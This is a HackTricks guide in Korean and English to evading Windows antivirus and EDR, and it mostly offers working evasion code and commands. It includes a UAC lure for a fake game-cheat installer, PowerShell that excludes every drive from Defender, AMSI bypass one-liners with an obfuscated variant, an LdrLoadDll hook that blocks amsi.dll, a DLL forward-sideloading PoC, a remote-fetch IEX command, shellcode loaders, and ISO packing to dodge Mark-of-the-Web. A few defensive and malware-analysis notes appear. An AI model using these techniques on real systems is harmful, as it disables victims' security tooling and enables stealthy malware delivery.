# 안티바이러스(AV) 우회

{{#include ../banners/hacktricks-training.md}}

**이 페이지는** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender 중지

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender 작동을 중지시키는 도구.
- [no-defender](https://github.com/es3n1n/no-defender): 다른 AV를 가장하여 Windows Defender 작동을 중지시키는 도구.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender를 조작하기 전에 사용하는 설치형 UAC 미끼

게임 치트로 위장한 공개 로더들은 종종 서명되지 않은 Node.js/Nexe 설치 프로그램으로 배포되며, 먼저 **ask the user for elevation** 하고 그 다음에 Defender를 무력화합니다. 흐름은 단순합니다:

1. `net session`으로 관리자 컨텍스트를 확인합니다. 이 명령은 호출자가 관리자 권한을 가질 때만 성공하므로, 실패하면 로더가 일반 사용자 권한으로 실행 중임을 나타냅니다.
2. 원래 명령줄을 유지한 채 예상되는 UAC 동의 프롬프트를 유발하기 위해 즉시 `RunAs` verb로 자체를 재실행합니다.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
피해자들은 이미 “cracked” 소프트웨어를 설치한다고 믿기 때문에, 해당 프롬프트를 보통 수락하여 malware가 Defender의 정책을 변경할 권한을 얻게 된다.

### 모든 드라이브 문자에 대한 일괄 `MpPreference` 제외

권한 상승 후, GachiLoader-style 체인은 서비스를 완전히 비활성화하는 대신 Defender의 사각지대를 극대화한다. 로더는 먼저 GUI 감시 프로세스(`taskkill /F /IM SecHealthUI.exe`)를 종료한 다음, **매우 광범위한 제외 규칙**을 적용하여 모든 사용자 프로필, 시스템 디렉터리, 및 이동식 디스크를 스캔 불가 상태로 만든다:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- The loop walks every mounted filesystem (D:\, E:\, USB sticks, etc.) so **any future payload dropped anywhere on disk is ignored**.
- The `.sys` extension exclusion is forward-looking—attackers reserve the option to load unsigned drivers later without touching Defender again.
- All changes land under `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, letting later stages confirm the exclusions persist or expand them without re-triggering UAC.

Because no Defender service is stopped, naïve health checks keep reporting “antivirus active” even though real-time inspection never touches those paths.

## **AV 회피 방법론**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection is achieved by flagging known malicious strings or arrays of bytes in a binary or script, and also extracting information from the file itself (e.g. file description, company name, digital signatures, icon, checksum, etc.). This means that using known public tools may get you caught more easily, as they've probably been analyzed and flagged as malicious. There are a couple of ways of getting around this sort of detection:

- **Encryption**

If you encrypt the binary, there will be no way for AV of detecting your program, but you will need some sort of loader to decrypt and run the program in memory.

- **Obfuscation**

Sometimes all you need to do is change some strings in your binary or script to get it past AV, but this can be a time-consuming task depending on what you're trying to obfuscate.

- **Custom tooling**

If you develop your own tools, there will be no known bad signatures, but this takes a lot of time and effort.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

I highly recommend you check out this [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) about practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis is when the AV runs your binary in a sandbox and watches for malicious activity (e.g. trying to decrypt and read your browser's passwords, performing a minidump on LSASS, etc.). This part can be a bit trickier to work with, but here are some things you can do to evade sandboxes.

- **Sleep before execution** Depending on how it's implemented, it can be a great way of bypassing AV's dynamic analysis. AV's have a very short time to scan files to not interrupt the user's workflow, so using long sleeps can disturb the analysis of binaries. The problem is that many AV's sandboxes can just skip the sleep depending on how it's implemented.
- **Checking machine's resources** Usually Sandboxes have very little resources to work with (e.g. < 2GB RAM), otherwise they could slow down the user's machine. You can also get very creative here, for example by checking the CPU's temperature or even the fan speeds, not everything will be implemented in the sandbox.
- **Machine-specific checks** If you want to target a user who's workstation is joined to the "contoso.local" domain, you can do a check on the computer's domain to see if it matches the one you've specified, if it doesn't, you can make your program exit.

It turns out that Microsoft Defender's Sandbox computername is HAL9TH, so, you can check for the computer name in your malware before detonation, if the name matches HAL9TH, it means you're inside defender's sandbox, so you can make your program exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>출처: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Some other really good tips from [@mgeeky](https://twitter.com/mariuszbit) for going against Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

As we've said before in this post, **public tools** will eventually **get detected**, so, you should ask yourself something:

For example, if you want to dump LSASS, **do you really need to use mimikatz**? Or could you use a different project which is lesser known and also dumps LSASS.

The right answer is probably the latter. Taking mimikatz as an example, it's probably one of, if not the most flagged piece of malware by AVs and EDRs, while the project itself is super cool, it's also a nightmare to work with it to get around AVs, so just look for alternatives for what you're trying to achieve.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Whenever it's possible, always **prioritize using DLLs for evasion**, in my experience, DLL files are usually **way less detected** and analyzed, so it's a very simple trick to use in order to avoid detection in some cases (if your payload has some way of running as a DLL of course).

As we can see in this image, a DLL Payload from Havoc has a detection rate of 4/26 in antiscan.me, while the EXE payload has a 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 비교: 일반 Havoc EXE 페이로드 vs 일반 Havoc DLL</p></figcaption></figure>

Now we'll show some tricks you can use with DLL files to be much more stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
이 명령은 "C:\Program Files\\" 내부에서 DLL hijacking에 취약한 프로그램 목록과 해당 프로그램들이 로드하려고 시도하는 DLL 파일들을 출력합니다.

직접 **DLL Hijackable/Sideloadable programs**를 탐색해 보시길 강력히 권합니다. 이 기술은 제대로 수행하면 상당히 은밀하지만, 공개적으로 알려진 DLL Sideloadable programs를 사용하면 쉽게 발각될 수 있습니다.

프로그램이 로드할 것으로 예상하는 이름의 악성 DLL을 단순히 배치한다고 해서 payload가 실행되는 것은 아닙니다. 프로그램은 그 DLL 안에 특정 함수들을 기대하기 때문입니다. 이 문제를 해결하기 위해 우리는 **DLL Proxying/Forwarding**이라는 다른 기법을 사용할 것입니다.

**DLL Proxying**은 프로그램이 proxy(및 악성) DLL에 보내는 호출을 원래 DLL로 전달하여 프로그램의 기능을 유지하면서 payload 실행을 처리할 수 있게 해줍니다.

저는 [@flangvik](https://twitter.com/Flangvik/)의 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 프로젝트를 사용할 것입니다.

다음은 제가 수행한 단계입니다:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
마지막 명령은 2개의 파일을 생성합니다: DLL 소스 코드 템플릿과 원본 이름이 변경된 DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

둘 다, 우리 shellcode ( [SGN](https://github.com/EgeBalci/sgn)으로 인코딩됨 )와 proxy DLL은 [antiscan.me](https://antiscan.me)에서 0/26 탐지율을 기록했습니다! 저는 이를 성공이라고 부르겠습니다.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE 모듈은 실제로 "forwarders"인 함수를 export할 수 있습니다: 코드 주소를 가리키는 대신, export 엔트리는 `TargetDll.TargetFunc` 형태의 ASCII 문자열을 포함합니다. 호출자가 export를 해석(resolve)할 때, Windows 로더는 다음을 수행합니다:

- `TargetDll`이 아직 로드되어 있지 않다면 로드합니다
- 그로부터 `TargetFunc`를 해석합니다

이해해야 할 주요 동작:
- `TargetDll`이 KnownDLL이면 보호된 KnownDLLs 네임스페이스(예: ntdll, kernelbase, ole32)에서 제공합니다.
- `TargetDll`이 KnownDLL이 아니면, 모듈의 디렉터리를 포함하는 일반적인 DLL 검색 순서가 사용됩니다.

이것은 간접적인 sideloading primitive를 가능하게 합니다: 함수가 non-KnownDLL 모듈 이름으로 forward된 signed DLL을 찾아서, 그 signed DLL과 동일한 디렉터리에 forward 대상 모듈 이름과 정확히 일치하는 attacker-controlled DLL을 함께 배치합니다. forwarded export가 호출되면, 로더는 forward를 해석하고 동일한 디렉터리에서 여러분의 DLL을 로드하여 DllMain을 실행합니다.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll`은 KnownDLL이 아니므로 표준 검색 순서에 따라 해결됩니다.

PoC (copy-paste):
1) 서명된 시스템 DLL을 쓰기 가능한 폴더로 복사합니다.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 동일한 폴더에 악성 `NCRYPTPROV.dll`을(를) 배치하세요. 최소한의 `DllMain`만으로도 코드 실행이 가능하며, `DllMain`을 트리거하기 위해 포워딩된 함수를 구현할 필요는 없습니다.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 서명된 LOLBin으로 포워드를 트리거:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- 로더가 `KeyIsoSetAuditingInterface`를 해결하는 동안, forward를 따라 `NCRYPTPROV.SetAuditingInterface`로 연결된다
- 그 다음 로더는 `C:\test`에서 `NCRYPTPROV.dll`을 로드하고 그 `DllMain`을 실행한다
- 만약 `SetAuditingInterface`가 구현되어 있지 않다면, `DllMain`이 이미 실행된 이후에야 "missing API" 오류가 발생한다

Hunting tips:
- 타겟 모듈이 KnownDLL이 아닌 forwarded exports에 주목하라. KnownDLLs는 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`에 나열되어 있다.
- 다음과 같은 툴을 사용해 forwarded exports를 열거할 수 있다:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Windows 11 forwarder 인벤토리에서 후보를 검색하세요: https://hexacorn.com/d/apis_fwd.txt

탐지/방어 아이디어:
- Monitor LOLBins (예: rundll32.exe)가 비시스템 경로에서 서명된 DLL을 로드한 뒤, 동일한 기본 이름을 가진 non-KnownDLLs를 해당 디렉터리에서 로드하는 것을 모니터링하세요
- 사용자 쓰기 가능한 경로에서 다음과 같은 프로세스/모듈 체인에 대해 경보를 발생시키세요: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`
- 코드 무결성 정책(WDAC/AppLocker)을 적용하고 애플리케이션 디렉터리에서 write+execute 권한을 거부하세요

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze는 suspended processes, direct syscalls, 그리고 alternative execution methods를 사용하여 EDRs를 우회하는 payload toolkit입니다`

Freeze를 사용해 shellcode를 은밀하게 로드하고 실행할 수 있습니다.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 회피는 단지 쥐와 고양이의 게임입니다. 오늘 통하는 방법이 내일에는 탐지될 수 있으니, 절대 한 가지 도구에만 의존하지 말고 가능하면 여러 회피 기법을 연쇄적으로 사용하세요.

## AMSI (Anti-Malware Scan Interface)

AMSI는 [fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)를 방지하기 위해 만들어졌습니다. 초기에 AVs는 **files on disk**만 스캔할 수 있었기 때문에, 페이로드를 **directly in-memory**로 실행할 수 있다면 AVs는 가시성이 부족하여 이를 막을 수 없었습니다.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

이 기능은 스크립트 내용을 암호화되지 않고 난독화되지 않은 형태로 노출하여 antivirus 솔루션이 스크립트 동작을 검사할 수 있게 합니다.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

amsi:를 앞에 붙이고 스크립트가 실행된 실행 파일의 경로(이 경우, powershell.exe)를 표시하는 것을 확인하세요.

디스크에 파일을 떨어뜨리지 않았음에도 AMSI 때문에 in-memory에서 탐지되었습니다.

더욱이, **.NET 4.8**부터는 C# 코드도 AMSI를 통해 실행됩니다. 이는 `Assembly.Load(byte[])`로 in-memory 실행을 할 때에도 영향을 미칩니다. 따라서 AMSI를 회피하려면 in-memory 실행 시 .NET의 낮은 버전(예: 4.7.2 이하)을 사용하는 것이 권장됩니다.

There are a couple of ways to get around AMSI:

- **Obfuscation**

AMSI는 주로 정적 탐지로 동작하므로, 로드하려는 스크립트를 수정하는 것이 탐지 회피에 효과적일 수 있습니다.

하지만 AMSI는 여러 레이어로 난독화되어 있어도 스크립트를 역난독화할 수 있는 기능을 가지고 있기 때문에, 난독화는 어떻게 했느냐에 따라 오히려 좋지 않은 선택이 될 수 있습니다. 그래서 회피가 그렇게 단순하지 않을 수 있습니다. 다만 경우에 따라 몇몇 변수 이름만 바꾸면 통과하는 경우도 있으니, 얼마나 심하게 플래그가 찍혔는지에 따라 달라집니다.

- **AMSI Bypass**

AMSI는 powershell(또는 cscript.exe, wscript.exe 등) 프로세스에 DLL을 로드하는 방식으로 구현되어 있으므로, 권한이 없는 사용자로 실행 중일 때도 이를 쉽게 조작할 수 있습니다. AMSI 구현의 이 결함 때문에 연구자들은 AMSI 스캔을 회피하는 여러 방법을 발견했습니다.

**Forcing an Error**

AMSI 초기화를 실패하게 만들면(amsiInitFailed) 현재 프로세스에 대해 어떠한 스캔도 시작되지 않습니다. 이 방법은 원래 [Matt Graeber](https://twitter.com/mattifestation)가 공개했으며, Microsoft는 더 넓은 사용을 막기 위해 시그니처를 개발했습니다.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
한 줄의 powershell 코드만으로 현재 powershell 프로세스에서 AMSI를 사용할 수 없게 만들 수 있었습니다. 이 줄은 물론 AMSI 자체에 의해 탐지되었으므로 이 기법을 사용하려면 약간의 수정이 필요합니다.

다음은 제가 이 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)에서 가져온 수정된 AMSI bypass입니다.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
이 게시물이 나오면 아마 감지될 가능성이 있으니, 탐지되지 않으려는 계획이라면 어떤 코드도 공개하지 않는 것이 좋습니다.

**Memory Patching**

이 기법은 처음에 [@RastaMouse](https://twitter.com/_RastaMouse/)에 의해 발견되었으며, 사용자 입력을 스캔하는 역할을 하는 "AmsiScanBuffer" 함수의 주소를 amsi.dll에서 찾아 E_INVALIDARG 코드를 반환하도록 덮어쓰는 방식입니다. 이렇게 하면 실제 스캔의 결과가 0으로 반환되어 클린한 결과로 해석됩니다.

> [!TIP]
> 자세한 설명은 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)를 읽어보세요.

AMSI를 powershell로 우회하기 위한 다른 많은 기법들도 있으니, 자세한 내용은 [**이 페이지**](basic-powershell-for-pentesters/index.html#amsi-bypass) 및 [**이 리포지토리**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)를 확인하세요.

### AMSI 차단: amsi.dll 로드 방지 (LdrLoadDll hook)

AMSI는 현재 프로세스에 `amsi.dll`이 로드된 이후에만 초기화됩니다. 강력하고 언어에 구애받지 않는 우회 방법은 요청된 모듈이 `amsi.dll`일 때 오류를 반환하도록 `ntdll!LdrLoadDll`에 사용자 모드 후크를 거는 것입니다. 그 결과 AMSI는 로드되지 않고 해당 프로세스에서는 스캔이 발생하지 않습니다.

구현 개요 (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- PowerShell, WScript/CScript 및 커스텀 로더 등 AMSI를 로드하는 모든 환경에서 동작합니다.
- 긴 커맨드라인 아티팩트를 피하기 위해 스크립트를 stdin으로 공급하는 것(`PowerShell.exe -NoProfile -NonInteractive -Command -`)과 함께 사용하세요.
- LOLBins를 통해 실행되는 로더(예: `regsvr32`가 `DllRegisterServer`를 호출하는 경우)에 의해 사용되는 것이 관찰되었습니다.

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** 또한 무작위화된 사용자 정의 함수, 변수, 문자 표현을 사용하고 PowerShell 키워드에 무작위 문자 대소문자 변형을 적용하여 시그니처를 회피하는 AMSI 우회 스크립트를 생성합니다.

**감지된 시그니처 제거**

현재 프로세스의 메모리에서 감지된 AMSI 시그니처를 제거하려면 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 및 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 같은 도구를 사용할 수 있습니다. 이 도구들은 현재 프로세스의 메모리를 스캔하여 AMSI 시그니처를 찾은 뒤 해당 부분을 NOP 명령으로 덮어써 메모리에서 실질적으로 제거합니다.

**AMSI를 사용하는 AV/EDR 제품들**

AMSI를 사용하는 AV/EDR 제품 목록은 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 에서 확인할 수 있습니다.

**PowerShell 버전 2 사용**
PowerShell 버전 2를 사용하면 AMSI가 로드되지 않으므로 스크립트가 AMSI에 의해 스캔되지 않고 실행됩니다. 다음과 같이 할 수 있습니다:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging은 시스템에서 실행된 모든 PowerShell 명령을 기록할 수 있는 기능입니다. 이는 감사(auditing) 및 문제해결(troubleshooting)에 유용할 수 있지만, 탐지를 회피하려는 공격자에게는 **문제가 될 수 있습니다**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: 이 목적을 위해 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 같은 도구를 사용할 수 있습니다.
- **Use Powershell version 2**: PowerShell version 2를 사용하면 AMSI가 로드되지 않아 AMSI에 의해 스캔되지 않고 스크립트를 실행할 수 있습니다. 이렇게 실행하세요: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 방어 기능이 없는 PowerShell 세션을 생성하려면 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 를 사용하세요 (이는 Cobal Strike의 `powerpick`이 사용하는 방법입니다).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 난독화 도구**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 이 프로젝트의 목적은 [LLVM](http://www.llvm.org/) 컴파일 스위트의 오픈 소스 포크를 제공하여 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 및 변조 방지를 통해 소프트웨어 보안을 향상시키는 것입니다.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator는 외부 도구를 사용하거나 컴파일러를 수정하지 않고 `C++11/14` 언어를 사용해 컴파일 시점에 난독화된 코드를 생성하는 방법을 보여줍니다.
- [**obfy**](https://github.com/fritzone/obfy): C++ 템플릿 메타프로그래밍 프레임워크가 생성한 난독화 연산 레이어를 추가하여 애플리케이션을 크래킹하려는 사람의 작업을 조금 더 어렵게 만듭니다.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz는 .exe, .dll, .sys 등을 포함한 다양한 pe 파일을 난독화할 수 있는 x64 바이너리 난독화기입니다.
- [**metame**](https://github.com/a0rtega/metame): Metame는 임의 실행 파일을 위한 간단한 메타모픽 코드 엔진입니다.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator는 ROP(return-oriented programming)를 사용하여 LLVM 지원 언어를 위한 정교한 코드 난독화 프레임워크입니다. ROPfuscator는 일반 명령어를 ROP 체인으로 변환하여 어셈블리 수준에서 프로그램을 난독화하며, 정상적인 제어 흐름에 대한 우리의 직관을 방해합니다.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt는 Nim으로 작성된 .NET PE Crypter입니다.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor는 기존 EXE/DLL을 shellcode로 변환한 다음 로드할 수 있습니다

## SmartScreen & MoTW

인터넷에서 일부 실행 파일을 다운로드해 실행할 때 이 화면을 본 적이 있을 것입니다.

Microsoft Defender SmartScreen은 잠재적으로 악성일 수 있는 애플리케이션 실행으로부터 최종 사용자를 보호하기 위한 보안 메커니즘입니다.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen은 주로 평판 기반 접근 방식으로 작동합니다. 즉, 흔하지 않게 다운로드되는 애플리케이션은 SmartScreen을 유발하여 파일 실행을 경고 및 차단합니다(단, More Info -> Run anyway를 클릭하면 파일을 여전히 실행할 수 있습니다).

**MoTW** (Mark of The Web)는 Zone.Identifier라는 이름의 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)으로, 인터넷에서 파일을 다운로드할 때 해당 파일과 함께 다운로드된 URL과 함께 자동으로 생성됩니다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 파일의 Zone.Identifier ADS를 확인하는 모습.</p></figcaption></figure>

> [!TIP]
> 실행 파일이 **신뢰된** 서명 인증서로 서명된 경우 **SmartScreen을 트리거하지 않습니다**.

payload가 Mark of The Web을 받지 않도록 하는 매우 효과적인 방법은 ISO와 같은 컨테이너 안에 패키징하는 것입니다. 이는 Mark-of-the-Web (MOTW)이 **non NTFS** 볼륨에 **적용될 수 없기 때문입니다**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 payload를 Mark-of-the-Web을 회피하기 위해 출력 컨테이너에 패키징하는 도구입니다.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
